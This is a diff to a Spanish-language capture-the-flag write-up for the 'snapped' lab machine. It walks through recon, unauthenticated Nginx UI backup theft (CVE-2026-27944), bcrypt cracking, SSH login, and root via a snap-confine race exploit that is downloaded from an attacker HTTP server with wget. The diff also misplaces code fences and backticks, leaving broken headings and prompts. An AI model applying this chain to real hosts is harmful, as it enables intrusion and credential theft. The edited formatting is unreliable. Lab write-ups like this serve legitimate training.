@@ -34,15 +34,13 @@ summary: "Explotación de CVE-2026-27944 en Nginx UI para extraer backup con cre
 Empezamos con un escaneo completo de puertos para identificar la superficie expuesta del servidor. Solo vimos dos puertos abiertos: SSH y un servidor web.
 
 ```bash
-nmap -p- --open -sS --min-rate 5000 -Pn 10.129.7.255
+$ nmap -p- --open -sS --min-rate 5000 -Pn 10.129.7.255
 ```
-
 Con los puertos identificados, hicimos un escaneo más detallado con scripts de enumeración para obtener versiones y fingerprints de cada servicio detectado.
 
 ```bash
-nmap -p22,80 -sCV 10.129.7.255
+$ nmap -p22,80 -sCV 10.129.7.255
 ```
-
 Descubrimos:
 
 | Puerto | Servicio | Versión |
@@ -53,35 +51,30 @@ Descubrimos:
 El puerto 80 redirige a `http://snapped.htb/`. Agregamos el dominio al archivo hosts para poder navegarlo correctamente.
 
 ```bash
-echo "10.129.7.255 snapped.htb" >> /etc/hosts
+$ echo "10.129.7.255 snapped.htb" >> /etc/hosts
 ```
-
 ## Enumeración
 
 Identificamos el servidor web con whatweb para confirmar la tecnología detrás del sitio.
 
 ```bash
-whatweb http://snapped.htb
+$ whatweb http://snapped.htb
 ```
-
 Confirmamos **nginx 1.24.0** sirviendo contenido estático. Hicimos fuzzing de directorios en el sitio principal para descubrir rutas ocultas.
 
 ```bash
-gobuster dir -u http://snapped.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+$ gobuster dir -u http://snapped.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 ```
-
 El sitio principal solo contiene `index.html` — es una landing page estática sin rutas interesantes, un callejón sin salida. Al no encontrar nada útil, pasamos a fuzzing de subdominios.
 
 ```bash
-wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.snapped.htb" --hc 404 http://snapped.htb
+$ wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.snapped.htb" --hc 404 http://snapped.htb
 ```
-
 Descubrimos el subdominio `admin.snapped.htb`. Lo agregamos al hosts y lo inspeccionamos.
 
 ```bash
-echo "10.129.7.255 admin.snapped.htb" >> /etc/hosts
+$ echo "10.129.7.255 admin.snapped.htb" >> /etc/hosts
 ```
-
 El subdominio expone una interfaz **Nginx UI** — un panel de administración web para gestionar servidores nginx.
 
 ## Metodología de análisis del vector inicial
@@ -107,36 +100,33 @@ Paralelamente, notamos que la máquina ejecuta **Ubuntu 24.04** con **snap** ins
 Necesitamos obtener credenciales para acceder al sistema. Aprovechamos CVE-2026-27944 para descargar el backup de configuración de Nginx UI directamente desde la API sin necesidad de autenticación.
 
 ```bash
-curl -s -X GET "http://admin.snapped.htb/api/export" -o backup.zip
+$ curl -s -X GET "http://admin.snapped.htb/api/export" -o backup.zip
 ```
-
 El backup está protegido con contraseña. Desciframos el zip utilizando la clave de cifrado obtenida de la configuración de la aplicación y extrajimos su contenido.
 
 ```bash
-7z x backup.zip -p[REDACTED]
+$ 7z x backup.zip -p[REDACTED]
 ```
-
 Dentro encontramos dos archivos críticos:
 
 - **`app.ini`** — configuración de la aplicación con los secretos
 - **`database.db`** — base de datos SQLite con los usuarios
 
-#### Secretos del `app.ini`
-
+#### Secretos del `app.ini
+`
 | Campo | Valor |
 |-------|-------|
 | `JwtSecret` | `[REDACTED]` |
 | `Node Secret` | `[REDACTED]` |
 | `Crypto Secret` | `[REDACTED]` |
 
-#### Usuarios del `database.db`
-
+#### Usuarios del `database.db
+`
 Leemos los registros de usuarios desde la base de datos SQLite.
 
 ```bash
-sqlite3 database.db "SELECT * FROM users;"
+$ sqlite3 database.db "SELECT * FROM users;"
 ```
-
 | Usuario | Hash (bcrypt) |
 |---------|---------------|
 | `admin` | `$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm` |
@@ -145,9 +135,8 @@ sqlite3 database.db "SELECT * FROM users;"
 Los hashes son bcrypt con costo 10. Intentamos crackearlos con rockyou usando hashcat.
 
 ```bash
-hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-
 El hash de `jonathan` se crackeó correctamente. El de `admin` no apareció en rockyou.
 
 | Usuario | Contraseña |
@@ -157,9 +146,8 @@ El hash de `jonathan` se crackeó correctamente. El de `admin` no apareció en r
 Con la contraseña en nuestro poder, intentamos acceder por SSH.
 
 ```bash
-ssh jonathan@10.129.11.246
+$ ssh jonathan@10.129.11.246
 ```
-
 Ingresamos la contraseña `[REDACTED]` y accedemos al sistema. Estamos dentro.
 
 ### User Flag
@@ -167,54 +155,51 @@ Ingresamos la contraseña `[REDACTED]` y accedemos al sistema. Estamos dentro.
 ```bash
 jonathan@snapped:~$ cat user.txt
 [REDACTED]
-```
 
+```
 ## Escalada de privilegios
 
 Una vez dentro como jonathan, enumeramos el sistema en busca de vectores de escalada. Revisamos el directorio `/usr/lib/snapd/` y encontramos el binario `snap-confine` con el bit SUID activo.
 
 ```bash
 jonathan@snapped:~$ ls -la /usr/lib/snapd/
-```
 
+```
 ```
 -rwsr-xr-x  1 root root   159016 Aug 20  2024 snap-confine
-```
 
+```
 El binario `snap-confine` con SUID es vulnerable a **CVE-2026-3888**, una condición de carrera que permite escalar a root mediante la manipulación de `systemd-tmpfiles` en el namespace montado por snap-confine.
 
 Clonamos el exploit público desde GitHub.
 
 ```bash
-git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
+$ git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
 ```
-
 Compilamos el exploit y la librería de shell que se inyectará en el namespace. Usamos compilación estática para evitar problemas de dependencias en el remoto.
 
 ```bash
-gcc -O2 -static -o exploit exploit_suid.c
-gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
+$ gcc -O2 -static -o exploit exploit_suid.c
+$ gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
 ```
-
 Iniciamos un servidor HTTP en nuestra máquina atacante.
 
 ```bash
-python3 -m http.server 8000
+$ python3 -m http.server 8000
 ```
-
 Desde la máquina víctima, descargamos ambos archivos.
 
 ```bash
 jonathan@snapped:~/Desktop$ wget http://[REDACTED]:8000/exploit
 jonathan@snapped:~/Desktop$ wget http://[REDACTED]:8000/librootshell.so
-```
 
+```
 Damos permisos de ejecución.
 
 ```bash
 jonathan@snapped:~/Desktop$ chmod +x exploit librootshell.so
-```
 
+```
 Ejecutamos el exploit pasándole la librería maliciosa como argumento. El exploit realiza los siguientes pasos:
 
 1. Entra en la sandbox de Firefox (snap) para obtener un PID interno
@@ -224,19 +209,18 @@ Ejecutamos el exploit pasándole la librería maliciosa como argumento. El explo
 5. Ejecuta la condición de carrera entre `snap-confine` y `systemd-tmpfiles`
 6. Gana la carrera e inyecta la librería en el namespace privilegiado
 7. Dispara `snap-confine` con SUID para que ejecute nuestra librería como root
-8. Obtiene un binario SUID bash en `/var/snap/firefox/common/bash`
-
+8. Obtiene un binario SUID bash en `/var/snap/firefox/common/bash
+`
 ```bash
 jonathan@snapped:~/Desktop$ ./exploit librootshell.so
-```
 
+```
 El exploit confirma la explotación exitosa. Accedemos a la shell root usando el binario SUID creado.
 
 ```bash
-bash-5.1# cat /root/root.txt
-[REDACTED]
+$ bash-5.1# cat /root/root.txt
+$ [REDACTED]
 ```
-
 ## Cadena de explotación
 
 ```text
@@ -250,8 +234,8 @@ CVE-2026-27944 (Nginx UI Backup Extraction)
 -> clonado, compilación y transferencia del exploit
 -> condición de carrera → SUID bash
 -> shell como root
-```
 
+```
 ## Flags
 
 | Flag | Hash |
